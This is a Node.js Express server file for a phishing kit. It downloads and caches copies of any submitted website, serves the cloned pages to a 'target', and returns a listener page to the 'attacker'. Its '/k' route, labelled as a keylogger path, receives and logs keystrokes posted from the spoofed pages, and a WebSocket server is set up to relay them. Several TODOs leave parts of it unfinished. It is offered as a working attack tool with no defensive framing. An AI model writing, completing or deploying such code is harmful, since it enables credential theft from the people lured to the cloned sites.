const exp = require('express')
const cheer = require('cheerio').default
const puppet = require('puppeteer')
const fsp = require('fs/promises')
const fs = require('fs')
const http = require('http')
const isURL = require('is-url')
const path = require('path')
const Cache = require('./models/Cache')
const Spoof = require('./models/Spoof')
const WebSocket = require('ws')
let spoofURL = "https://www.google.com"
const log = console.log
const PORT = 8888
const app = exp()

//* PAGE CACHE
// production pages
const page_cache = new Cache() // build new cache object

//* STANDARD SERVER
const server = http.createServer(app)
//* ROUTING SERVER STARTUP
app.set('view engine', 'ejs')
app.set('views', path.join(__dirname, "templates"))
server.listen(PORT, (err) => {
    if (err) log(err)
    log(`Server running on port ${PORT}`)
})
//* WEBSOCKET SERVER
const wss = new WebSocket.Server({server})
wss.on('connection', (ws)=>{
    log('WSServer Listening')
    ws.on('message', (message) => {
        log(message)
    })
})

//* MIDDLEWARE
app.use(exp.urlencoded({extended: false}))
app.use(exp.json())
app.use(exp.static('static'))
app.use('/scripts', exp.static('scripts'))


//* ROUTING

//* SERVE SPOOF TO TARGET
app.get('/:spoof_id', (req, res)=>{
    log("SPOOF VISIT: " + req.params.spoof_id)
    // 404 on non existant spoof or invalid url
    // if(!isURL(req.params.spoof_id)) return res.sendStatus(404)
    if(!page_cache.pages[req.params.spoof_id]) return res.redirect('/')
    res.send(page_cache.pages[req.params.spoof_id].rendered_page)
})
//* INITITATE SPOOF AND SERVE LISTENER PAGE TO ATTACKER
app.post('/spoof', async (req, res)=>{ // takes in post form url field, and creates new spoof page from it, and responds with the url
    let url_2_spoof = decodeURI(req.body.url)
    log(`Spoof request for __ ${url_2_spoof} __`)
    let spoofPageObject = await create_spoof(url_2_spoof) // should return new path of spoofed page
    // TODO Replace redirect with ejs render function containing listener socket
    if(!spoofPageObject) return res.redirect('/')
    return res.render("spoofoutput.ejs", {page: spoofPageObject})
})


//! Handle creation of new pages for caching
async function create_spoof(url){ // creates spoof site and socket session, returns spoof Page object
    if(!isValid(url)) return null
    let new_page = new Spoof(url)
    let spoof_success = await new_page.downloadPage(url)
    if(!spoof_success) return false
    new_page.renderSpoof(url)
    // set into global pages object
    page_cache.addPage(new_page)

    //TODO Create new WS session
    return new_page
}
function isValid(url){
    if(isURL(url)) return true
    return false
}
//? KEYLOGGER PATH
app.post('/k', async (req, res)=>{
    log(req.body)

    // handle sending the key to the correct socket session

    return res.sendStatus(200)
})

//? 404
app.get('*', (req, res)=>{
    return res.redirect('/')
})



//* DEBUGGING
create_spoof("https://www.google.com")
// easy to view log of rendered input/output
// async function createLog(string){
//     let filename = "log.txt"
//     await fsp.writeFile(path.join(__dirname, "logs", filename), `rendered page - \n ${string}\ndownloaded page - \n ${downloaded_page}`)

// }
